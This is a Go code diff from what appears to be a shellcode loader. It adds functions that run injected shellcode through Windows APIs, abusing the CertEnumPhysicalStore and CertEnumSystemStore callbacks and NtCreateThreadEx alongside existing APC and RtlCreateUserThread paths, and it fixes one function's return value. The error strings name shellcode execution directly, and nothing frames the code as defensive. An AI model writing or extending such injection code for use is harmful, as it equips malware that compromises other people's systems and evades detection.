@@ -130,6 +130,7 @@ func runApc(
 ) (*state, error) {
 	var e error
 
+	// FIXME why?
 	s.thread, e = w32.RtlCreateUserThread(s.proc, 0, s.l.suspend)
 	if e != nil {
 		return nil, errors.Newf("failed to create thread: %w", e)
@@ -150,6 +151,45 @@ func runApcThreadEx(s *state) (*state, error) {
 	return runApc(s, w32.NtQueueApcThreadEx)
 }
 
+func runCertPhysical(s *state) (*state, error) {
+	var e error = w32.CertEnumPhysicalStore(
+		"My",
+		w32.Wincrypt.CertSystemStoreCurrentUser,
+		0,
+		s.addr,
+	)
+	if e != nil {
+		return nil, errors.Newf("failed to execute shellcode: %w", e)
+	}
+
+	return s, nil
+}
+
+func runCertSystem(s *state) (*state, error) {
+	var e error = w32.CertEnumSystemStore(
+		w32.Wincrypt.CertSystemStoreCurrentService,
+		0,
+		0,
+		s.addr,
+	)
+	if e != nil {
+		return nil, errors.Newf("failed to execute shellcode: %w", e)
+	}
+
+	return s, nil
+}
+
+func runCreateThreadEx(s *state) (*state, error) {
+	var e error
+
+	s.thread, e = w32.NtCreateThreadEx(s.proc, s.addr, s.l.suspend)
+	if e != nil {
+		return nil, errors.Newf("failed to execute shellcode: %w", e)
+	}
+
+	return s, nil
+}
+
 func runUserThread(s *state) (*state, error) {
 	var e error
 
@@ -158,7 +198,7 @@ func runUserThread(s *state) (*state, error) {
 		return nil, errors.Newf("failed to execute shellcode: %w", e)
 	}
 
-	return nil, nil
+	return s, nil
 }
 
 func writeMem(s *state, sc []byte) (*state, error) {
